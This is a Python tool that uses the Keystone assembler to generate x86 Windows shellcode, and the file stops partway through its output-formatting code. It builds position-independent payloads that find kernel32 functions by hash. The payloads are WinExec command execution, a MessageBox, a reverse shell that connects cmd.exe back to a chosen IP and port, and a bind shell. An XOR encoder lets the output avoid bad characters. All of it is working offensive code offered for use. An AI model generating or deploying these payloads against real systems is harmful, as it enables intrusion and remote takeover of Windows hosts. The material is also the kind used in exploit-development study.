#!/usr/bin/python3
import argparse, keystone

def hex_string(string):
    value = []

    for char in string[::-1]:
        value.append(f"{ord(char):02x}")

    return "".join(value)

def push(command):
    if len(command) % 4 == 0:
        result = [
            "cdq;",
            "push edx;"
        ]

        for i in range(len(command) -4, -1, -4):
            result.append(f"push 0x{hex_string(command[i:i + 4])};")

    elif len(command) % 4 == 1:
        result = [
            "cdq;",
            f"mov dl, 0x{hex_string(command[-1:])};",
            "push edx;"
        ]

        command = command[:-1]

        for i in range(len(command) -4, -1, -4):
            result.append(f"push 0x{hex_string(command[i:i + 4])};")

    elif len(command) % 4 == 2:
        result = [
            "cdq;",
            f"mov dx, 0x{hex_string(command[-2:])};",
            "push edx;"
        ]

        command = command[:-2]

        for i in range(len(command) -4, -1, -4):
            result.append(f"push 0x{hex_string(command[i:i + 4])};")

    elif len(command) % 4 == 3:
        neg_bytes = hex((~int(f"0x{hex_string(command[-3:])}", 16) + 1) & 0xffffffff)

        result = [
            f"mov edx, {neg_bytes};",
            "neg edx;",
            "push edx;"
        ]

        command = command[:-3]

        for i in range(len(command) -4, -1, -4):
            result.append(f"push 0x{hex_string(command[i:i + 4])};")

    return "".join(result)

def sin_ip(ip_addr):
    ip = "0x"
    null = False

    for block in ip_addr.split(".")[::-1]:
        ip += f"{int(block):02x}"

        if f"{int(block):02x}" == "00":
            null = True

    if null:
        neg_ip = hex((~int(ip, 16) + 1) & 0xffffffff)

        result = [
            f"mov ecx, {neg_ip};",
            "neg ecx;",
            "push ecx;"
        ]

        result = "".join(result)
    else:
       result = f"push {ip};"

    return result

def sin_port(port):
    hex_port = f"{int(port):04x}"

    if "00" == hex_port[0:2]:
        result = f"mov dh, 0x{hex_port[2:4]};"
    elif "00" == hex_port[2:4]:
        result = f"mov dl, 0x{hex_port[0:2]};"
    else:
        result = f"mov dx, 0x{hex_port[2:4]}{hex_port[0:2]};"

    return result

def xor(shellcode, key):
    result = []

    for byte in shellcode:
        xored = byte ^ key
        result.append(xored)

    return result

def decoder(badchars, len, key):
    if 0x10 in badchars:
        padding = "nop;"
    else:
        padding = ""

    if len > 0xff:
        subreg = "cx"
        if 1 in badchars:
            counter = f"mov cl, {len - 0x100}; inc ch;"
        else:
            counter = f"mov cx, {len};"
    else:
        counter = f"mov cl, {len};"

    valid = False
    regs = ["eax", "ebx", "edx", "esi", "edi"]

    for reg in regs:
        shellcode = [
            "_start                                    :",
            "    jmp .call                             ;", # short jump

            "    .decode                               :",
            f"       pop {reg}                         ;", # $esi = return addr
            f"       xor byte ptr [{reg}], {key}       ;", # restore first byte

            "        xor ecx, ecx                      ;", # $ecx = 0x0
            counter,                                       # $ecx = len

            "    .loop                                 :",
            padding,                                       # nop if needed
            f"       xor byte ptr [{reg} + ecx], {key} ;", # restore byte
            "        loop .loop                        ;", # loop until 0x0

            f"        jmp {reg}                        ;", # jmp shellcode

            "    .call                                 :",
            "        call .decode                      ;"  # relative call
        ]

        opcodes, count = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32).asm("".join(shellcode))

        if not any(badchar in opcodes for badchar in badchars):
            valid = True
            break

    if valid == False:
        return valid

    return opcodes

def encoder(shellcode, len, badchars):
    for key in range(1, 257):
        if key == 256:
            print("Could not create shellcode!")
            exit(1)

        encoded = xor(shellcode, key)

        if not any(badchar in encoded for badchar in badchars):
            opcodes = decoder(badchars, len - 1, key)

            if opcodes != False:
                break

    opcodes.extend(encoded)

    return opcodes

def exec(command):
    shellcode = [
        "_start                              :",
        "    mov ebp, esp                    ;", # new stack frame
        "    sub esp, 0x28                   ;", # space for variables

        "    .find_kernel32                  :",
        "        xor ecx, ecx                ;", # TEB structu re
        "        mov esi, fs:[ecx + 0x30]    ;", # PEB Address
        "        mov esi, [esi + 0xc]        ;", # ntdll!PebLdr
        "        mov esi, [esi + 0x14]       ;", # InMemoryOrderModuleList
        "        mov esi, [esi]              ;", # ntdll.dll
        "        lodsd                       ;", # kernel32.dll
        "        mov ebx, [eax + 0x10]       ;", # kernel32 base

        "        jmp .call_winexec           ;", # short jump

        "    .find_function                  :",
        "        pusha                       ;", # save all registers
        "        mov eax, [ebx + 0x3c]       ;", # RVA to PE signature
        "        mov edi, [ebx + eax + 0x78] ;", # RVA of Export Table
        "        add edi, ebx                ;", # Export Table
        "        mov ecx, [edi + 0x18]       ;", # NR of Names
        "        mov eax, [edi + 0x20]       ;", # RVA of Name Pointer Table
        "        add eax, ebx                ;", # Name Pointer Table
        "        mov [ebp - 0x4], eax        ;", # var4 = Name Pointer Table

        "    .find_loop                      :",
        "        jecxz .find_end             ;", # if ecx = 0x0
        "        dec ecx                     ;", # counter -= 1
        "        mov eax, [ebp - 0x4]        ;", # $eax = Name Pointer Table
        "        mov esi, [eax + ecx * 4]    ;", # RVA of symbol name
        "        add esi, ebx                ;", # symbol name

        "        xor eax, eax                ;", # $eax = 0x0
        "        cdq                         ;", # $edx = 0x0

        "    .compute_hash                   :",
        "        lodsb                       ;", # load in al next byte from esi
        "        test al, al                 ;", # check null terminator
        "        jz .compare_hash            ;", # If ZF == 1
        "        ror edx, 0x2f               ;", # rot 47
        "        add edx, eax                ;", # add new byte
        "        jmp .compute_hash           ;", # loop

        "    .compare_hash                   :",
        "        cmp edx, [esp + 0x24]       ;", # cmp edx, hash
        "        jnz .find_loop              ;", # if zf != 1
        "        mov edx, [edi + 0x24]       ;", # RVA of Ordinal Table
        "        add edx, ebx                ;", # Ordinal Table
        "        mov cx, [edx + 2 * ecx]     ;", # extrapolate ordinal functions
        "        mov edx, [edi + 0x1c]       ;", # RVA of Address Table
        "        add edx, ebx                ;", # Address Table
        "        mov eax, [edx + 4 * ecx]    ;", # RVA of function
        "        add eax, ebx                ;", # function
        "        mov [esp + 0x1c], eax       ;", # overwrite eax from pushad

        "    .find_end                       :",
        "        popa                        ;", # restore registers
        "        ret                         ;", # return

        "    .call_winexec                   :",
        "        push 0x10121ee3             ;", # WinExec() hash
        "        call .find_function         ;", # call .find_function
        push(command),
        "        mov esi, esp                ;", # "command"

        "        push 0x1                    ;", # uCmdShow
        "        push esi                    ;", # lpCmdLine
        "        call eax                    ;", # call WinExec()

        "    .exit                           :",
        "        push 0x8ee05933             ;", # TerminateProcess() hash
        "        call .find_function         ;", # call .find_function
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # uExitCode
        "        push 0xffffffff             ;", # hProcess
        "        call eax                    ;"  # call TerminateProcess()
    ]

    return "".join(shellcode)

def message(header, text):
    shellcode = [
        "_start:",
        "    mov ebp, esp                    ;", # new stack frame
        "    sub esp, 0x28                   ;", # space for variables

        "    .find_kernel32                  :",
        "        xor ecx, ecx                ;", # TEB structure
        "        mov esi, fs:[ecx + 0x30]    ;", # PEB Address
        "        mov esi, [esi + 0xc]        ;", # ntdll!PebLdr
        "        mov esi, [esi + 0x14]       ;", # InMemoryOrderModuleList
        "        mov esi, [esi]              ;", # ntdll.dll
        "        lodsd                       ;", # kernel32.dll
        "        mov ebx, [eax + 0x10]       ;", # kernel32 base

        "        jmp .find_short             ;", # short jump

        "    .find_ret                       :",
        "        pop esi                     ;", # $esi = return addr
        "        mov [ebp - 0x8], esi        ;", # var8 = .find_function
        "        jmp .symbol_kernel32        ;", # load function from kernel32

        "    .find_short                     :",
        "        call .find_ret              ;", # relative call

        "    .find_function                  :",
        "        pusha                       ;", # save all registers
        "        mov eax, [ebx + 0x3c]       ;", # RVA to PE signature
        "        mov edi, [ebx + eax + 0x78] ;", # RVA of Export Table
        "        add edi, ebx                ;", # Export Table
        "        mov ecx, [edi + 0x18]       ;", # NR of Names
        "        mov eax, [edi + 0x20]       ;", # RVA of Name Pointer Table
        "        add eax, ebx                ;", # Name Pointer Table
        "        mov [ebp - 0x4], eax        ;", # var4 = Name Pointer Table

        "    .find_loop                      :",
        "        jecxz .find_end             ;", # if ecx = 0x0
        "        dec ecx                     ;", # counter -= 1
        "        mov eax, [ebp - 0x4]        ;", # $eax = Name Pointer Table
        "        mov esi, [eax + ecx * 4]    ;", # RVA of symbol name
        "        add esi, ebx                ;", # symbol name

        "        xor eax, eax                ;", # $eax = 0x0
        "        cdq                         ;", # $edx = 0x0

        "    .compute_hash                   :",
        "        lodsb                       ;", # load in al next byte from esi
        "        test al, al                 ;", # check null terminator
        "        jz .compare_hash            ;", # If ZF == 1
        "        ror edx, 0x2f               ;", # rot 47
        "        add edx, eax                ;", # add new byte
        "        jmp .compute_hash           ;", # loop

        "   .compare_hash                    :",
        "        cmp edx, [esp + 0x24]       ;", # cmp edx, hash
        "        jnz .find_loop              ;", # if zf != 1
        "        mov edx, [edi + 0x24]       ;", # RVA of Ordinal Table
        "        add edx, ebx                ;", # Ordinal Table
        "        mov cx, [edx + 2 * ecx]     ;", # extrapolate ordinal functions
        "        mov edx, [edi + 0x1c]       ;", # RVA of Address Table
        "        add edx, ebx                ;", # Address Table
        "        mov eax, [edx + 4 * ecx]    ;", # RVA of function
        "        add eax, ebx                ;", # function
        "        mov [esp + 0x1c], eax       ;", # overwrite eax from pushad

        "    .find_end                       :",
        "        popa                        ;", # restore registers
        "        ret                         ;", # return

        "    .symbol_kernel32                :",
        "        push 0x8ee05933             ;", # TerminateProcess() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0xc], eax        ;", # var12 = ptr to TerminateProcess()

        "        push 0x583c436c             ;", # LoadLibraryA() hash
        "        call [ebp - 0x8]            ;", # call .find_function

        "    .load_user32                    :",
        "        cdq                         ;", # $edx = 0x0
        "        mov dx, 0x6c6c              ;", # "ll"
        "        push edx                    ;", # "ll\x00\x00"
        "        push 0x642e3233             ;", # "32.d"
        "        push 0x72657375             ;", # "user"
        "        push esp                    ;", # "user32.dll"
        "        call eax                    ;", # call LoadLibraryA()

        "    .symbol_user32                  :",
        "        mov ebx, eax                ;", # $ebx = user32 base

        "        push 0x1361c78e             ;", # MessageBoxA() hash
        "        call [ebp - 0x8]            ;", # call .find_function

        "    .call_messageboxa               :",
        push(header),                            # Header
        "        mov ebx, esp                ;", # $ebx = "shellcode"

        push(text),                              # Text
        "        mov ecx, esp                ;", # $ecx = "This is a message"

        "        cdq                         ;", # $edx = 0x0
        "        mov dl, 0x41                ;", # $edx = 0x41
        "        push edx                    ;", # uType
        "        push ebx                    ;", # lpCaption
        "        push ecx                    ;", # lpText
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # hWnd
        "        call eax                    ;", # call MessageBoxA()

        "    .exit                           :",
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # uExitCode
        "        push 0xffffffff             ;", # hProcess
        "        call [ebp - 0xc]            ;"  # call TerminateProcess()
    ]

    return "".join(shellcode)


def revshell(ip, port):
    shellcode = [
        "    mov ebp, esp                    ;", # new stack frame
        "    sub esp, 0x28                   ;", # space for variables

        "    .find_kernel32                  :",
        "        xor ecx, ecx                ;", # TEB structure
        "        mov esi, fs:[ecx + 0x30]    ;", # PEB Address
        "        mov esi, [esi + 0xc]        ;", # ntdll!PebLdr
        "        mov esi, [esi + 0x14]       ;", # InMemoryOrderModuleList
        "        mov esi, [esi]              ;", # ntdll.dll
        "        lodsd                       ;", # kernel32.dll
        "        mov ebx, [eax + 0x10]       ;", # kernel32 base

        "        jmp .find_short             ;", # short jump

        "    .find_ret                       :",
        "        pop esi                     ;", # $esi = return addr
        "        mov [ebp - 0x8], esi        ;", # var8 = .find_function
        "        jmp .symbol_kernel32        ;", # load function from kernel32

        "    .find_short                     :",
        "        call .find_ret              ;", # relative call

        "    .find_function                  :",
        "        pusha                       ;", # save all registers
        "        mov eax, [ebx + 0x3c]       ;", # RVA to PE signature
        "        mov edi, [ebx + eax + 0x78] ;", # RVA of Export Table
        "        add edi, ebx                ;", # Export Table
        "        mov ecx, [edi + 0x18]       ;", # NR of Names
        "        mov eax, [edi + 0x20]       ;", # RVA of Name Pointer Table
        "        add eax, ebx                ;", # Name Pointer Table
        "        mov [ebp - 0x4], eax        ;", # var4 = Name Pointer Table

        "    .find_loop                      :",
        "        jecxz .find_end             ;", # if ecx = 0x0
        "        dec ecx                     ;", # counter -= 1
        "        mov eax, [ebp - 0x4]        ;", # $eax = Name Pointer Table
        "        mov esi, [eax + ecx * 4]    ;", # RVA of symbol name
        "        add esi, ebx                ;", # symbol name
        "        xor eax, eax                ;", # $eax = 0x0
        "        cdq                         ;", # $edx = 0x0

        "    .compute_hash                   :",
        "        lodsb                       ;", # load in al next byte from esi
        "        test al, al                 ;", # check null terminator
        "        jz .compare_hash            ;", # If ZF == 1
        "        ror edx, 0x2f               ;", # rot 47
        "        add edx, eax                ;", # add new byte
        "        jmp .compute_hash           ;", # loop

        "    .compare_hash                   :",
        "        cmp edx, [esp + 0x24]       ;", # cmp edx, hash
        "        jnz .find_loop              ;", # if zf != 1
        "        mov edx, [edi + 0x24]       ;", # RVA of Ordinal Table
        "        add edx, ebx                ;", # Ordinal Table
        "        mov cx, [edx + 2 * ecx]     ;", # extrapolate ordinal functions
        "        mov edx, [edi + 0x1c]       ;", # RVA of Address Table
        "        add edx, ebx                ;", # Address Table
        "        mov eax, [edx + 4 * ecx]    ;", # RVA of function
        "        add eax, ebx                ;", # function
        "        mov [esp + 0x1c], eax       ;", # overwrite eax from pushad

        "    .find_end                       :",
        "        popa                        ;", # restore registers
        "        ret                         ;", # return

        "    .symbol_kernel32                :",
        "        push 0x8ee05933             ;", # TerminateProcess() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0xc], eax        ;", # var12 = ptr to TerminateProcess()

        "        push 0xa9f72dc9             ;", # CreateProcessA() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0x10], eax       ;", # var20 = ptr to CreateProcessA()

        "        push 0x583c436c             ;", # LoadLibraryA() hash
        "        call [ebp - 0x8]            ;", # call .find_function

        "    .load_ws2_32                    :",
        "        cdq                         ;", # $edx = 0x0
        "        mov dx, 0x6c6c              ;", # 'll'
        "        push edx                    ;", # 'll\x00\x00'
        "        push 0x642e3233             ;", # '32.d'
        "        push 0x5f327377             ;", # 'ws2_'
        "        push esp                    ;", # 'ws2_32.dll'
        "        call eax                    ;", # call LoadLibraryA()

        "    .symbol_ws2_32                  :",
        "        mov ebx, eax                ;", # $ebx = ws2_32 base

        "        push 0xe0a06fc5             ;", # WSASocketA() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0x14], eax       ;", # var28 = ptr to WSASocketA()

        "        push 0xe0966ca8             ;", # WSAConnect() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0x18], eax       ;", # var32 = ptr to WSAConnect()

        "        push 0xe17a7010             ;", # WSAStartup() hash
        "        call [ebp - 0x8]            ;", # call .find_function

        "    .call_wsastartup                :",
        "        mov edx, esp                ;", # $edx = $esp
        "        xor ecx, ecx                ;", # $ecx = 0x0
        "        mov cx, 0x590               ;", # $ecx = 0x590
        "        sub edx, ecx                ;", # sub ecx to avoid overwriting
        "        push edx                    ;", # lpWSAData
        "        xor edx, edx                ;", # $edx = 0x0
        "        mov dx, 0x0202              ;", # $edx = 0x00000202
        "        push edx                    ;", # wVersionRequired
        "        call eax                    ;", # call WSAStartup()

        "    .call_wsasocketa                :",
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # dwFlags
        "        push edx                    ;", # g
        "        push edx                    ;", # lpProtocolInfo
        "        mov dl, 0x6                 ;", # IPPROTO_TCP
        "        push edx                    ;", # protocol
        "        mov dl, 0x1                 ;", # SOCK_STREAM
        "        push edx                    ;", # type
        "        inc edx                     ;", # AF_INET
        "        push edx                    ;", # af
        "        call [ebp - 0x14]           ;", # call WSASocketA()

        "    .call_wsaconnect                :",
        "        mov esi, eax                ;", # socket descriptor
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # sin_zero[]
        "        push edx                    ;", # sin_zero[]
        sin_ip(ip),                              # "ip"
        sin_port(port),                          # port
        "        shl edx, 0x10               ;", # shift eax
        "        add dx, 0x2                 ;", # add 0x2
        "        push edx                    ;", # sin_port & sin_family
        "        mov edi, esp                ;", # $edi = sockaddr_in

        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # lpGQOS
        "        push edx                    ;", # lpSQOS
        "        push edx                    ;", # lpCalleeData
        "        push edx                    ;", # lpCallerData
        "        mov dl, 0x10                ;", # $edx = 0x10
        "        push edx                    ;", # namelen
        "        push edi                    ;", # name
        "        push esi                    ;", # s
        "        call [ebp - 0x18]           ;", # call WSAConnect()

        "    .create_startupinfoa            :",
        "        push esi                    ;", # hStdError
        "        push esi                    ;", # hStdOutput
        "        push esi                    ;", # hStdInput
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # lpReserved2
        "        push edx                    ;", # cbReserved2 & wShowWindow
        "        mov dh, 0x1                 ;", # $edx = 0x100
        "        push edx                    ;", # dwFlags
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # dwFillAttribute
        "        push edx                    ;", # dwYCountChars
        "        push edx                    ;", # dwXCountChars
        "        push edx                    ;", # dwYSize
        "        push edx                    ;", # dwXSize
        "        push edx                    ;", # dwY
        "        push edx                    ;", # dwX
        "        push edx                    ;", # lpTitle
        "        push edx                    ;", # lpDesktop
        "        push edx                    ;", # lpReserved
        "        mov dl, 0x44                ;", # $edx = 0x44
        "        push edx                    ;", # cb
        "        mov edi, esp                ;", # $edi = startupinfoa

        "    .create_string                  :",
        "        mov eax, 0xff9a879b         ;", # $edx = 0xff9a879b
        "        neg eax                     ;", # $edx = 0x00657865
        "        push eax                    ;", # "exe\x00"
        "        push 0x2e646d63             ;", # "cmd."
        "        mov ebx, esp                ;", # $ebx = "cmd.exe"

        "    .call_createprocessa            :",
        "        mov edx, esp                ;", # $edx = $esp
        "        xor ecx, ecx                ;", # $ecx = 0x0
        "        mov cx, 0x390               ;", # $ecx = 0x390
        "        sub edx, ecx                ;", # sub cx to avoid overwriting
        "        push edx                    ;", # lpProcessInformation
        "        push edi                    ;", # lpStartupInfo
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # lpCurrentDirectory
        "        push edx                    ;", # lpEnvironment
        "        push edx                    ;", # dwCreationFlags
        "        inc edx                     ;", # $edx = 0x1 (TRUE)
        "        push edx                    ;", # bInheritHandles
        "        dec edx                     ;", # $edx = 0x0
        "        push edx                    ;", # lpThreadAttributes
        "        push edx                    ;", # lpProcessAttributes
        "        push ebx                    ;", # lpCommandLine
        "        push edx                    ;", # lpApplicationName
        "        call [ebp - 0x10]           ;", # call CreateProcessA()

        "    .exit                           :",
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # uExitCode
        "        push 0xffffffff             ;", # hProcess
        "        call [ebp - 0xc]            ;"  # call TerminateProcess()
    ]

    return "".join(shellcode)

def bindshell(port):
    shellcode = [
        "_start                              :",
        "    mov ebp, esp                    ;", # new stack frame
        "    sub esp, 0x28                   ;", # space for variables

        "    .find_kernel32                  :",
        "        xor ecx, ecx                ;", # TEB structure
        "        mov esi, fs:[ecx + 0x30]    ;", # PEB Address
        "        mov esi, [esi + 0xc]        ;", # ntdll!PebLdr
        "        mov esi, [esi + 0x14]       ;", # InMemoryOrderModuleList
        "        mov esi, [esi]              ;", # ntdll.dll
        "        lodsd                       ;", # kernel32.dll
        "        mov ebx, [eax + 0x10]       ;", # kernel32 base

        "        jmp .find_short             ;", # short jump

        "    .find_ret                       :",
        "        pop esi                     ;", # $esi = return addr
        "        mov [ebp - 0x8], esi        ;", # var8 = .find_function
        "        jmp .symbol_kernel32        ;", # load function from kernel32

        "    .find_short                     :",
        "        call .find_ret              ;", # relative call

        "    .find_function                  :",
        "        pusha                       ;", # save all registers
        "        mov eax, [ebx + 0x3c]       ;", # RVA to PE signature
        "        mov edi, [ebx + eax + 0x78] ;", # RVA of Export Table
        "        add edi, ebx                ;", # Export Table
        "        mov ecx, [edi + 0x18]       ;", # NR of Names
        "        mov eax, [edi + 0x20]       ;", # RVA of Name Pointer Table
        "        add eax, ebx                ;", # Name Pointer Table
        "        mov [ebp - 0x4], eax        ;", # var4 = Name Pointer Table

        "    .find_loop                      :",
        "        jecxz .find_end             ;", # if ecx = 0x0
        "        dec ecx                     ;", # counter -= 1
        "        mov eax, [ebp - 0x4]        ;", # $eax = Name Pointer Table
        "        mov esi, [eax + ecx * 4]    ;", # RVA of symbol name
        "        add esi, ebx                ;", # symbol name

        "        xor eax, eax                ;", # $eax = 0x0
        "        cdq                         ;", # $edx = 0x0

        "    .compute_hash                   :",
        "        lodsb                       ;", # load in al next byte from esi
        "        test al, al                 ;", # check null terminator
        "        jz .compare_hash            ;", # If ZF == 1
        "        ror edx, 0x2f               ;", # rot 47
        "        add edx, eax                ;", # add new byte
        "        jmp .compute_hash           ;", # loop

        "   .compare_hash                    :",
        "        cmp edx, [esp + 0x24]       ;", # cmp edx, hash
        "        jnz .find_loop              ;", # if zf != 1
        "        mov edx, [edi + 0x24]       ;", # RVA of Ordinal Table
        "        add edx, ebx                ;", # Ordinal Table
        "        mov cx, [edx + 2 * ecx]     ;", # extrapolate ordinal functions
        "        mov edx, [edi + 0x1c]       ;", # RVA of Address Table
        "        add edx, ebx                ;", # Address Table
        "        mov eax, [edx + 4 * ecx]    ;", # RVA of function
        "        add eax, ebx                ;", # function
        "        mov [esp + 0x1c], eax       ;", # overwrite eax from pushad

        "    .find_end                       :",
        "        popa                        ;", # restore registers
        "        ret                         ;", # return

        "    .symbol_kernel32                :",
        "        push 0x8ee05933             ;", # TerminateProcess() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0xc], eax        ;", # var12 = ptr to TerminateProcess()

        "        push 0xa9f72dc9             ;", # CreateProcessA() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0x10], eax       ;", # var20 = ptr to CreateProcessA()

        "        push 0x583c436c             ;", # LoadLibraryA() hash
        "        call [ebp - 0x8]            ;", # call .find_function

        "    .load_ws2_32                    :",
        "        cdq                         ;", # $edx = 0x0
        "        mov dx, 0x6c6c              ;", # "ll"
        "        push edx                    ;", # "ll\x00\x00"
        "        push 0x642e3233             ;", # "32.d"
        "        push 0x5f327377             ;", # "ws2_"
        "        push esp                    ;", # "ws2_32.dll"
        "        call eax                    ;", # call LoadLibraryA()

        "    .symbol_ws2_32                  :",
        "        mov ebx, eax                ;", # $ebx = ws2_32 base

        "        push 0xe0a06fc5             ;", # WSASocketA() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0x14], eax       ;", # var28 = ptr to WSASocketA()

        "        push 0x3ec0208              ;", # bind() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0x18], eax       ;", # var32 = ptr to bind()

        "        push 0x11e208ce             ;", # listen() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0x1c], eax       ;", # var36 = ptr to listen()

        "        push 0x10180838             ;", # accept() hash
        "        call [ebp - 0x8]            ;", # call .find_function
        "        mov [ebp - 0x20], eax       ;", # var40 = ptr to accept()

        "        push 0xe17a7010             ;", # WSAStartup() hash
        "        call [ebp - 0x8]            ;", # call .find_function

        "    .call_wsastartup                :",
        "        mov edx, esp                ;", # $eax = $esp
        "        xor ecx, ecx                ;", # $ecx = 0x0
        "        mov cx, 0x590               ;", # $ecx = 0x590
        "        sub edx, ecx                ;", # sub ecx to avoid overwriting
        "        push edx                    ;", # lpWSAData
        "        xor edx, edx                ;", # $eax = 0x0
        "        mov dx, 0x0202              ;", # $eax = 0x00000202
        "        push edx                    ;", # wVersionRequired
        "        call eax                    ;", # call WSAStartup()

        "    .call_wsasocketa                :",
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # dwFlags
        "        push edx                    ;", # g
        "        push edx                    ;", # lpProtocolInfo
        "        mov dl, 0x6                 ;", # IPPROTO_TCP
        "        push edx                    ;", # protocol
        "        mov dl, 0x1                 ;", # SOCK_STREAM
        "        push edx                    ;", # type
        "        inc edx                     ;", # AF_INET
        "        push edx                    ;", # af
        "        call [ebp - 0x14]           ;", # call WSASocketA()

        "    .call_bind                      :",
        "        mov esi, eax                ;", # socket descriptor
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # "0.0.0.0"
        sin_port(port),                          # port
        "        shl edx, 0x10               ;", # shift eax
        "        add dx, 0x2                 ;", # add 0x2
        "        push edx                    ;", # sin_port & sin_family
        "        mov edi, esp                ;", # $edi = sockaddr_in

        "        cdq                         ;", # $edx = 0x0
        "        mov dl, 0x10                ;", # $edx = 0x10
        "        push edx                    ;", # namelen
        "        push edi                    ;", # name
        "        push esi                    ;", # s
        "        call [ebp - 0x18]           ;", # call bind()

        "    .call_listen                    :",
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # backlog
        "        push esi                    ;", # s
        "        call [ebp - 0x1c]           ;", # call listen()

        "    .call_accept                    :",
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # addrlen
        "        push edx                    ;", # addr
        "        push esi                    ;", # s
        "        call [ebp - 0x20]           ;", # call accept()

        "    .create_startupinfoa            :",
        "        mov esi, eax                ;", # socket descriptor
        "        push esi                    ;", # hStdError
        "        push esi                    ;", # hStdOutput
        "        push esi                    ;", # hStdInput
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # lpReserved2
        "        push edx                    ;", # cbReserved2 & wShowWindow
        "        mov dh, 0x1                 ;", # $edx = 0x100
        "        push edx                    ;", # dwFlags
        "        cdq                         ;", # $eax = 0x0
        "        push edx                    ;", # dwFillAttribute
        "        push edx                    ;", # dwYCountChars
        "        push edx                    ;", # dwXCountChars
        "        push edx                    ;", # dwYSize
        "        push edx                    ;", # dwXSize
        "        push edx                    ;", # dwY
        "        push edx                    ;", # dwX
        "        push edx                    ;", # lpTitle
        "        push edx                    ;", # lpDesktop
        "        push edx                    ;", # lpReserved
        "        mov dl, 0x44                ;", # $edx = 0x44
        "        push edx                    ;", # cb
        "        mov edi, esp                ;", # $edi = startupinfoa

        "    .create_string                  :",
        "        mov eax, 0xff9a879b         ;", # $eax = 0xff9a879b
        "        neg eax                     ;", # $eax = 0x00657865
        "        push eax                    ;", # "exe\x00"
        "        push 0x2e646d63             ;", # "cmd."
        "        mov ebx, esp                ;", # $ebx = "cmd.exe"

        "    .call_createprocessa            :",
        "        mov edx, esp                ;", # $edx = $esp
        "        xor ecx, ecx                ;", # $ecx = 0x0
        "        mov cx, 0x390               ;", # $ecx = 0x390
        "        sub edx, ecx                ;", # sub cx to avoid overwriting
        "        push edx                    ;", # lpProcessInformation
        "        push edi                    ;", # lpStartupInfo
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # lpCurrentDirectory
        "        push edx                    ;", # lpEnvironment
        "        push edx                    ;", # dwCreationFlags
        "        inc edx                     ;", # $edx = 0x1 (TRUE)
        "        push edx                    ;", # bInheritHandles
        "        dec edx                     ;", # $eax = 0x0
        "        push edx                    ;", # lpThreadAttributes
        "        push edx                    ;", # lpProcessAttributes
        "        push ebx                    ;", # lpCommandLine
        "        push edx                    ;", # lpApplicationName
        "        call [ebp - 0x10]           ;", # call CreateProcessA()

        "    .exit                           :",
        "        cdq                         ;", # $edx = 0x0
        "        push edx                    ;", # uExitCode
        "        push 0xffffffff             ;", # hProcess
        "        call [ebp - 0xc]            ;"  # call TerminateProcess()
    ]

    return "".join(shellcode)

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("--exec", help="Command to execute with WinExec()")
    parser.add_argument("--message", action="store_true", help="Display a message with MessageBox()")
    parser.add_argument("--header", help="Header for MessageBox")
    parser.add_argument("--text", help="Text for MessageBox")
    parser.add_argument("--revshell", action="store_true", help="Send a reverse shell to specified ip and port")
    parser.add_argument("--bindshell", action="store_true", help="Start a bind shell in specified port")
    parser.add_argument("--ip", help="IP address for send reverse shell")
    parser.add_argument("--port", help="Port for send/start reverse/bind shell")
    parser.add_argument("--format", help="Format for display shellcode (py/c#/c/rs)")
    parser.add_argument("--length", type=int, help="Length to bytes for line", default=11)
    parser.add_argument("--badchars", help="Check if badchar exists in shellcode and avoid, example: '\x00\x0a\x0d'")
    args = parser.parse_args()

    if args.exec:
        shellcode = exec(args.exec)
    elif args.message:
        if args.header and args.text:
            shellcode = message(args.header, args.text)
        else:
            print("Arguments required: (--header/--text)")
            exit(1)
    elif args.revshell:
        if args.ip and args.port:
            shellcode = revshell(args.ip, args.port)
        else:
            print("Arguments required: (--ip/--port)")
            exit(1)
    elif args.bindshell:
        if args.port:
            shellcode = bindshell(args.port)
        else:
            print("Argument required: (--port)")
            exit(1)
    else:
        print("Option required: (--exec/--message/--revshell/--bindshell)")
        exit(1)

    opcodes, count = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32).asm(shellcode)

    if args.badchars:
        badchars = []

        for i in range(0, len(args.badchars), 4):
            badchars.append(int(args.badchars[i+2:i+4], 16))

            if any(badchar in opcodes for badchar in badchars):
                opcodes = encoder(opcodes, len(opcodes), badchars)

    if args.format:
        if args.format.lower() == "python" or args.format.lower() == "py":
            output = "shellcode  = b\"\""
            length = args.length

            for i in range(0, len(opcodes), length):
                line = ""

                for opcode in opcodes[i:i+length]:
                    line += f"\\x{opcode:02x}"

                output += f"\nshellcode += b\"{line}\""

            print(output)

        elif args.format.lower() == "c#" or args.format.lower() == "csharp" or args.format.lower() == "cs":
            output = f"byte[] shellcode = new byte[{len(opcodes)}] {{\n"
            length = args.length

            for i in range(0, len(opcodes), length):
                output += "    "

                for j in range(length):
                    if i + j < len(opcodes):
                        output += f"0x{opcodes[i+j]:02x},"

                output += "\n"

            output = output[:-2] + "\n};"
            print(output)

        elif args.format.lower() == "c":
